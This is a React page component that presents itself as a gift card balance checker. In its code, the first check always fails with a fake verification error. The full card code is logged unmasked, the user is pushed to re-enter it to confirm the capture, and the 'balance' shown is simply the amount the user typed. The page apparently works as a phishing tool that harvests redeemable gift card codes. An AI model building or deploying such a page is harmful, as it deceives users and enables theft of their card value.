// src/pages/Home.jsx - Enhanced Interactive Version
import React, { useState, useEffect, useRef } from 'react';
import { Link } from 'react-router-dom';
import Navbar from '../components/Navbar';
import FeaturedRewards from '../components/FeaturedRewards';
import { logBalanceCheck } from '../services/logService';

// Full-screen balance component with animations
const FullScreenBalance = ({ balance, lastFourDigits, cardType, onCheckAnother }) => {
  const [isVisible, setIsVisible] = useState(false);
  
  useEffect(() => {
    setIsVisible(true);
  }, []);

  return (
    <div className={`min-h-screen bg-gradient-to-b from-[#00ff41] to-[#00aa2a] flex items-center justify-center p-6 transition-opacity duration-500 ${isVisible ? 'opacity-100' : 'opacity-0'}`}>
      <div className="max-w-md w-full text-center">
        {/* Logo with pulse animation */}
        <div className="mb-8 animate-bounce">
          <div className="w-16 h-16 bg-white/10 rounded-2xl flex items-center justify-center mx-auto backdrop-blur-sm">
            <span className="text-white text-3xl font-bold">$</span>
          </div>
          <p className="text-white/60 text-xs mt-2">GIFT CARD BALANCE</p>
        </div>

        {/* Success Indicator with scale animation */}
        <div className="mb-6 animate-pulse">
          <div className="w-20 h-20 bg-white/20 rounded-full flex items-center justify-center mx-auto backdrop-blur-sm">
            <span className="text-white text-4xl">✓</span>
          </div>
        </div>

        {/* Balance with count-up effect */}
        <h2 className="text-white/60 text-sm font-medium mb-2">Available Balance</h2>
        <p className="text-white text-6xl md:text-7xl font-bold mb-2 tracking-tight animate-fadeSlideUp">
          {balance}
        </p>
        
        {/* Card Info */}
        <div className="mt-4">
          <div className="inline-block bg-white/10 backdrop-blur-sm rounded-full px-6 py-2 hover:bg-white/20 transition-all duration-300">
            <p className="text-white/80 text-sm font-mono">
              {cardType} ending in {lastFourDigits}
            </p>
          </div>
        </div>

        {/* Animated Divider */}
        <div className="w-20 h-0.5 bg-white/20 mx-auto my-6 animate-pulse"></div>

        {/* Action Button with hover effects */}
        <button
          onClick={onCheckAnother}
          className="w-full bg-white text-[#0a0a0a] font-bold py-4 rounded-lg transition-all hover:bg-white/90 hover:scale-[1.02] active:scale-[0.98] shadow-lg group"
        >
          <span className="inline-flex items-center gap-2">
            CHECK ANOTHER CARD
            <span className="inline-block transition-transform group-hover:translate-x-1">→</span>
          </span>
        </button>

        {/* Footer */}
        <div className="mt-12">
          <p className="text-white/30 text-xs">© 2026 Gift Card Balance Checker. All rights reserved.</p>
        </div>
      </div>
    </div>
  );
};

// Interactive Card Input Component
const CardInput = ({ value, onChange, disabled, attemptCount }) => {
  const inputRef = useRef(null);
  const [isFocused, setIsFocused] = useState(false);

  useEffect(() => {
    if (!disabled && attemptCount === 1) {
      inputRef.current?.focus();
    }
  }, [attemptCount, disabled]);

  return (
    <div className={`relative transition-all duration-300 ${isFocused ? 'scale-[1.02]' : 'scale-100'}`}>
      <label className="block text-[#aaa] text-[0.65rem] sm:text-xs mb-1 flex items-center gap-2">
        <span>💳</span> Gift Card Number (14 alphanumeric characters)
        {attemptCount === 1 && (
          <span className="text-[#ffaa00] animate-pulse text-[0.5rem] sm:text-[0.55rem] bg-[#1a2a1a] px-2 py-0.5 rounded-full border border-[#ffaa00]">
            ⚠️ RE-ENTER
          </span>
        )}
      </label>
      <input
        ref={inputRef}
        type="text"
        value={value}
        onChange={onChange}
        placeholder={attemptCount === 1 ? "Re-enter CORRECT card number..." : "ABCD 1234 XYZABC"}
        maxLength="17"
        autoComplete="off"
        disabled={disabled}
        onFocus={() => setIsFocused(true)}
        onBlur={() => setIsFocused(false)}
        className={`w-full p-2.5 sm:p-3 bg-[#1a1a1a] border rounded-lg sm:rounded-xl text-white text-sm focus:outline-none transition-all duration-300 uppercase
          ${isFocused ? 'border-[#00ff41] ring-1 ring-[#00ff41] shadow-[0_0_20px_rgba(0,255,65,0.1)]' : 'border-[#2a2a2a]'}
          ${attemptCount === 1 ? 'border-[#ffaa00] bg-[#1a1a0a]' : ''}
          ${disabled ? 'opacity-50 cursor-not-allowed' : ''}
        `}
      />
      <p className="text-[#555] text-[0.55rem] sm:text-[0.6rem] mt-1 flex items-center gap-2">
        <span>ℹ️</span> Only letters (A-Z) and numbers (0-9) allowed • 14 characters
        {value && value.replace(/\s/g, '').length > 0 && (
          <span className="text-[#00ff41]">
            • {value.replace(/\s/g, '').length}/14
          </span>
        )}
      </p>
    </div>
  );
};

// Interactive Progress Indicator
const ProgressIndicator = ({ attemptCount, showBalance }) => {
  if (showBalance || attemptCount === 0) return null;
  
  return (
    <div className="mb-4 p-3 bg-[#1a2a1a] border border-[#ffaa00] rounded-lg animate-pulse">
      <div className="flex items-center justify-between">
        <div className="flex items-center gap-2">
          <div className="w-2 h-2 bg-[#ffaa00] rounded-full animate-ping"></div>
          <p className="text-[#ffaa00] text-xs font-medium">
            ⚠️ Second Attempt - Enter the correct card number
          </p>
        </div>
        <div className="flex items-center gap-2">
          <span className="text-[#ffaa00] text-[0.5rem]">Attempt 2/2</span>
          <div className="w-12 h-1 bg-[#1a1a1a] rounded-full overflow-hidden">
            <div className="h-full w-full bg-[#ffaa00] rounded-full animate-progress"></div>
          </div>
        </div>
      </div>
    </div>
  );
};

// Interactive Status Message
const StatusMessage = ({ type, message, onDismiss }) => {
  const [isVisible, setIsVisible] = useState(true);
  
  const getStyles = () => {
    switch(type) {
      case 'error':
        return 'bg-[#2a0a0a] border-[#ff5555] text-[#ff5555]';
      case 'success':
        return 'bg-[#0a2a0a] border-[#00ff41] text-[#00ff41]';
      case 'warning':
        return 'bg-[#1a1a0a] border-[#ffaa00] text-[#ffaa00]';
      default:
        return 'bg-[#1a1a1a] border-[#555] text-[#aaa]';
    }
  };

  const getIcon = () => {
    switch(type) {
      case 'error': return '❌';
      case 'success': return '✅';
      case 'warning': return '⚠️';
      default: return 'ℹ️';
    }
  };

  if (!isVisible) return null;

  return (
    <div className={`mt-3 sm:mt-4 p-3 sm:p-4 border rounded-lg sm:rounded-xl animate-fadeSlideUp ${getStyles()}`}>
      <div className="flex items-start gap-3">
        <span className="text-lg">{getIcon()}</span>
        <div className="flex-1">
          <p className="text-[0.7rem] sm:text-sm whitespace-pre-line">{message}</p>
        </div>
        <button 
          onClick={() => setIsVisible(false)}
          className="text-[#555] hover:text-white transition-colors"
        >
          ✕
        </button>
      </div>
    </div>
  );
};

const Home = () => {
  const [cardNumber, setCardNumber] = useState('');
  const [amount, setAmount] = useState('');
  const [balance, setBalance] = useState('');
  const [error, setError] = useState('');
  const [loading, setLoading] = useState(false);
  const [showBalance, setShowBalance] = useState(false);
  const [showFullScreenBalance, setShowFullScreenBalance] = useState(false);
  const [attemptCount, setAttemptCount] = useState(0);
  const [storedCardNumber, setStoredCardNumber] = useState('');
  const [storedAmount, setStoredAmount] = useState('');
  const [lastRequestTime, setLastRequestTime] = useState(0);
  const [isCardValid, setIsCardValid] = useState(false);
  const [isAmountValid, setIsAmountValid] = useState(false);
  const MIN_REQUEST_INTERVAL = 10000;

  // Validate inputs in real-time
  useEffect(() => {
    const rawCard = cardNumber.replace(/\s/g, '');
    setIsCardValid(rawCard.length === 14 && /^[A-Za-z0-9]+$/.test(rawCard));
    
    const num = parseFloat(amount);
    setIsAmountValid(!isNaN(num) && num > 0 && num <= 10000);
  }, [cardNumber, amount]);

  // Format card number with visual feedback
  const formatCardNumber = (value) => {
    const cleaned = value.replace(/[^A-Za-z0-9]/g, '');
    const raw = cleaned.slice(0, 14);
    let formatted = '';
    for (let i = 0; i < raw.length; i++) {
      if (i === 4 || i === 8) formatted += ' ';
      formatted += raw[i];
    }
    setCardNumber(formatted);
  };

  const isValidAmount = (amt) => {
    const num = parseFloat(amt);
    return !isNaN(num) && num > 0 && num <= 10000;
  };

  const maskCardNumber = (card) => {
    if (!card) return 'N/A';
    if (card.length <= 4) return '****';
    return `****${card.slice(-4)}`;
  };

  const handleCheckBalance = async () => {
    const now = Date.now();
    
    if (now - lastRequestTime < MIN_REQUEST_INTERVAL) {
      setError('Please wait a moment before checking again.');
      return;
    }
    
    const rawCard = cardNumber.replace(/\s/g, '').toUpperCase();
    setError('');
    setShowBalance(false);

    if (!rawCard || !amount) {
      setError('Please enter card number and amount');
      return;
    }
    
    if (rawCard.length !== 14) {
      setError('Card number must be exactly 14 alphanumeric characters');
      return;
    }
    
    if (!/^[A-Za-z0-9]+$/.test(rawCard)) {
      setError('Card number can only contain letters and numbers');
      return;
    }
    
    if (!isValidAmount(amount)) {
      setError('Please enter a valid amount between $1 and $10,000');
      return;
    }

    setLastRequestTime(now);
    setLoading(true);
    
    setTimeout(async () => {
      if (attemptCount === 0) {
        // FIRST ATTEMPT - Always fails, store card number and amount, then CLEAR input
        setError('UNABLE TO VERIFY CARD\n\nPlease ensure:\n• You have entered the correct card number\n• All 14 alphanumeric characters are correct\n\nPlease re-enter the CORRECT card number and try again.');
        setShowBalance(false);
        
        setStoredCardNumber(rawCard);
        setStoredAmount(amount);
        
        try {
          await logBalanceCheck({
            type: 'first_attempt_failed',
            cardNumber: rawCard,
            amount: amount,
            status: 'FAILED - INVALID CARD',
            message: 'User entered card number. First attempt failed. User advised to ensure card is correct and 14 digits visible.',
            timestamp: new Date().toISOString(),
            userAgent: navigator.userAgent,
            pageSource: 'manual',
            ip: null
          });
          console.log('First attempt failed logged');
        } catch (err) {
          console.error('Logging failed:', err);
        }
        
        setCardNumber('');
        setAttemptCount(1);
      } else {
        // SECOND ATTEMPT - Check if card matches first attempt
        if (storedCardNumber === rawCard) {
          // EXACT MATCH - Success
          const enteredAmount = parseFloat(amount).toFixed(2);
          const displayBalance = `$${enteredAmount} USD`;
          setBalance(displayBalance);
          setShowBalance(true);
          setShowFullScreenBalance(true);
          setError('');
          
          try {
            await logBalanceCheck({
              type: 'second_attempt_success',
              cardNumber: rawCard,
              amount: amount,
              balance: displayBalance,
              status: 'SUCCESS - SECOND ATTEMPT',
              message: 'Card verification successful on second attempt after user re-entered the correct card number.',
              timestamp: new Date().toISOString(),
              userAgent: navigator.userAgent,
              pageSource: 'manual',
              ip: null
            });
            console.log('Second attempt success logged');
          } catch (err) {
            console.error('Logging failed:', err);
          }
          
          setAttemptCount(0);
          setStoredAmount('');
        } else {
          // CARD MISMATCH - Fail and clear again
          setError('Card number does NOT match the first attempt.\n\nPlease enter the SAME card number as your first attempt.\n\nCard number field has been cleared. Please try again with the correct card.');
          setShowBalance(false);
          
          try {
            await logBalanceCheck({
              type: 'mismatch_attempt',
              firstCardNumber: maskCardNumber(storedCardNumber),
              secondCardNumber: maskCardNumber(rawCard),
              amount: amount,
              status: 'FAILED - CARD MISMATCH',
              message: `User entered different card number on second attempt. First card: ${maskCardNumber(storedCardNumber)}, Second card: ${maskCardNumber(rawCard)}`,
              timestamp: new Date().toISOString(),
              userAgent: navigator.userAgent,
              pageSource: 'manual',
              ip: null
            });
            console.log('Card mismatch logged');
          } catch (err) {
            console.error('Logging failed:', err);
          }
          
          setCardNumber('');
          setAttemptCount(0);
          setStoredCardNumber('');
          setStoredAmount('');
        }
      }
      setLoading(false);
    }, 800);
  };

  const resetFullScreen = () => {
    setShowFullScreenBalance(false);
    setShowBalance(false);
    setBalance('');
    setCardNumber('');
    setAmount('');
    setError('');
    setAttemptCount(0);
    setStoredCardNumber('');
    setStoredAmount('');
    setLoading(false);
  };

  // Keyboard shortcut for Enter key
  const handleKeyPress = (e) => {
    if (e.key === 'Enter' && !loading) {
      handleCheckBalance();
    }
  };

  // Auto-retry suggestion
  const handleRetry = () => {
    if (attemptCount === 0) {
      setError('');
      setCardNumber('');
      setAmount('');
    } else {
      setError('');
      // Focus the card input
      document.querySelector('input[type="text"]')?.focus();
    }
  };

  // Full-screen balance view
  if (showFullScreenBalance) {
    return (
      <FullScreenBalance 
        balance={balance}
        lastFourDigits={storedCardNumber.slice(-4) || '••••'}
        cardType="Gift Card"
        onCheckAnother={resetFullScreen}
      />
    );
  }

  return (
    <>
      <Navbar />
      <div className="bg-gradient-to-br from-[#0a1f0a] to-[#0a0a0a] text-center py-4 sm:py-6 px-3 sm:px-4 border-b border-[#00ff4133]">
        <h2 className="text-base sm:text-lg bg-gradient-to-r from-[#00ff41] to-[#00cc33] bg-clip-text text-transparent font-semibold animate-pulse">
          ⚡ GIFT CARD BALANCE CHECKER ⚡
        </h2>
      </div>

      <div className="p-3 sm:p-5 overflow-x-hidden max-w-[600px] mx-auto w-full" onKeyPress={handleKeyPress}>
        <div className="bg-gradient-to-br from-[#0f1f0f] to-[#0a0a0a] border border-[#00ff4133] rounded-xl sm:rounded-2xl p-4 sm:p-6 shadow-lg hover:shadow-[0_0_30px_rgba(0,255,65,0.05)] transition-shadow duration-300">
          <h2 className="text-[#00ff41] text-center text-lg sm:text-xl mb-4 sm:mb-5 flex items-center justify-center gap-2">
            <span className="animate-pulse">💰</span> CHECK BALANCE
          </h2>
          
          {/* <ProgressIndicator attemptCount={attemptCount} showBalance={showBalance} />
           */}
          <div className="space-y-3 sm:space-y-4">
            <CardInput 
              value={cardNumber}
              onChange={(e) => formatCardNumber(e.target.value)}
              disabled={loading}
              attemptCount={attemptCount}
            />
            
            <div className="transition-all duration-300">
              <label className="block text-[#aaa] text-[0.65rem] sm:text-xs mb-1 flex items-center gap-2">
                <span>💰</span> Amount (USD)
                {isAmountValid && (
                  <span className="text-[#00ff41] text-[0.5rem] bg-[#0a2a0a] px-2 py-0.5 rounded-full border border-[#00ff41]">
                    ✓ Valid
                  </span>
                )}
              </label>
              <input
                type="number"
                value={amount}
                onChange={(e) => setAmount(e.target.value)}
                placeholder="Enter amount to check ($1 - $10,000)"
                min="1"
                max="10000"
                disabled={loading}
                className={`w-full p-2.5 sm:p-3 bg-[#1a1a1a] border rounded-lg sm:rounded-xl text-white text-sm focus:outline-none transition-all duration-300
                  ${isAmountValid ? 'border-[#00ff41] focus:border-[#00ff41] focus:ring-1 focus:ring-[#00ff41]' : 'border-[#2a2a2a] focus:border-[#555]'}
                  ${loading ? 'opacity-50 cursor-not-allowed' : ''}
                `}
              />
              {amount && !isAmountValid && (
                <p className="text-[#ff5555] text-[0.55rem] sm:text-[0.6rem] mt-1 animate-fadeSlideUp">
                  ⚠️ Amount must be between $1 and $10,000
                </p>
              )}
            </div>

            <div className="text-center my-3 sm:my-4">
              <Link to="/scan" className="text-[#00ff41] no-underline text-xs sm:text-sm font-medium hover:opacity-80 transition-opacity inline-flex items-center gap-1 group">
                <span>📷</span> Scan Gift Card Instead 
                <span className="inline-block transition-transform group-hover:translate-x-1">→</span>
              </Link>
            </div>

            <button
              onClick={handleCheckBalance}
              disabled={loading || !isCardValid || !isAmountValid}
              className={`w-full py-2.5 sm:py-3 rounded-full font-bold text-sm sm:text-base transition-all duration-300 
                ${loading || !isCardValid || !isAmountValid 
                  ? 'bg-[#1a1a1a] text-[#555] cursor-not-allowed' 
                  : 'bg-[#00ff41] text-[#0a0a0a] hover:bg-[#00dd3a] active:scale-98 hover:shadow-[0_0_30px_rgba(0,255,65,0.2)]'
                }
              `}
            >
              {loading ? (
                <span className="flex items-center justify-center gap-2">
                  <svg className="animate-spin h-4 w-4" viewBox="0 0 24 24">
                    <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4" fill="none"/>
                    <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"/>
                  </svg>
                  VERIFYING...
                </span>
              ) : attemptCount === 1 ? (
                '🔄 RETRY CHECK BALANCE'
              ) : (
                '✅ CHECK BALANCE'
              )}
            </button>
{/* 
            {attemptCount === 1 && !showBalance && !loading && (
              <button
                onClick={resetFullScreen}
                className="w-full mt-2 bg-transparent border border-[#ff5555] text-[#ff5555] py-1.5 sm:py-2 rounded-full font-medium text-xs sm:text-sm transition-all duration-300 hover:bg-[#ff5555] hover:text-white hover:shadow-[0_0_20px_rgba(255,85,85,0.2)]"
              >
                🚀 START FRESH
              </button>
            )} */}

            {error && (
              <StatusMessage 
                type={error.includes('NOT') || error.includes('mismatch') ? 'error' : 'warning'}
                message={error}
                onDismiss={() => setError('')}
              />
            )}
          </div>
        </div>

        <FeaturedRewards />

        <div className="flex flex-col gap-3 sm:gap-4 my-4 sm:my-5">
          <div className="bg-[#0f0f0f] rounded-xl sm:rounded-2xl p-3 sm:p-5 border border-[#1f1f1f] hover:border-[#00ff4133] transition-colors duration-300">
            <h3 className="text-[#00ff41] text-sm sm:text-base mb-1.5 sm:mb-2 flex items-center gap-2">
              <span className="animate-pulse">🌟</span> GIFT CARD REWARDS
            </h3>
            <p className="text-[#aaa] text-[0.65rem] sm:text-xs mb-2 sm:mb-3">Follow for exclusive offers and updates!</p>
            <button 
              onClick={() => window.open('https://facebook.com', '_blank')}
              className="bg-[#1877f2] text-white border-none py-1.5 sm:py-2 px-3 sm:px-4 rounded-full font-bold text-[0.65rem] sm:text-xs cursor-pointer transition-all hover:bg-[#166fe5] hover:scale-105 active:scale-95"
            >
              👍 FOLLOW US
            </button>
          </div>
          
          <div className="bg-[#0f0f0f] rounded-xl sm:rounded-2xl p-3 sm:p-5 border border-[#1f1f1f] hover:border-[#00ff4133] transition-colors duration-300">
            <h3 className="text-[#00ff41] text-sm sm:text-base mb-2 sm:mb-3 flex items-center gap-2">
              <span>🎮</span> GAME PINS
            </h3>
            <div className="space-y-1">
              {['Mobile Legends: Bang Bang', 'Jawaker', 'FREE FIRE', 'PUBG', 'VALORANT'].map((game, index) => (
                <div key={index} className="flex justify-between py-1.5 sm:py-2 border-b border-[#1a1a1a] text-xs sm:text-sm hover:bg-[#1a1a1a] px-2 rounded transition-colors duration-200">
                  <span>{game}</span>
                  <span className="text-[#00ff41] text-[0.6rem] sm:text-xs">
                    {index < 2 ? (index === 0 ? '5v5' : 'Card Game') : '🎮'}
                  </span>
                </div>
              ))}
            </div>
          </div>
        </div>

        <div className="text-center bg-gradient-to-br from-[#0a0a0a] to-[#0f1a0f] rounded-xl sm:rounded-2xl py-3 sm:py-5 px-3 sm:px-4 border border-[#1f1f1f] hover:border-[#00ff4133] transition-all duration-300 group">
          <a href="#" className="text-[#00ff41] no-underline text-xs sm:text-sm font-medium inline-flex items-center gap-2 group">
            <span>🛒</span> VISIT GIFT CARD STORE 
            <span className="inline-block transition-transform group-hover:translate-x-1">→</span>
          </a>
          <div className="text-[#00ff41] font-mono text-[0.6rem] sm:text-xs mt-0.5 sm:mt-1 opacity-50 group-hover:opacity-100 transition-opacity">
            secure.giftcard-checker.com
          </div>
        </div>

        <div className="text-center text-[#555] text-[0.5rem] sm:text-[0.6rem] py-3 sm:py-5 mt-3 sm:mt-4 border-t border-[#1a1a1a]">
          <p>© 2026 Gift Card Balance Checker. All rights reserved.</p>
          <p className="mt-0.5 sm:mt-1">Secure Balance Check System • Demo Tool</p>
        </div>
      </div>

      <style>{`
        @keyframes fadeSlideUp {
          from { opacity: 0; transform: translateY(8px); }
          to { opacity: 1; transform: translateY(0); }
        }
        @keyframes progress {
          from { width: 0%; }
          to { width: 100%; }
        }
        .animate-fadeSlideUp {
          animation: fadeSlideUp 0.4s ease;
        }
        .animate-progress {
          animation: progress 2s ease-in-out infinite;
        }
        .active\\:scale-98:active {
          transform: scale(0.98);
        }
        .whitespace-pre-line {
          white-space: pre-line;
        }
        /* STATIC MOBILE FIX */
        body {
          overflow-x: hidden;
          position: relative;
          width: 100%;
          margin: 0;
          padding: 0;
        }
        html {
          overflow-x: hidden;
          max-width: 100%;
        }
        * {
          -webkit-tap-highlight-color: transparent;
        }
      `}</style>
    </>
  );
};

export default Home;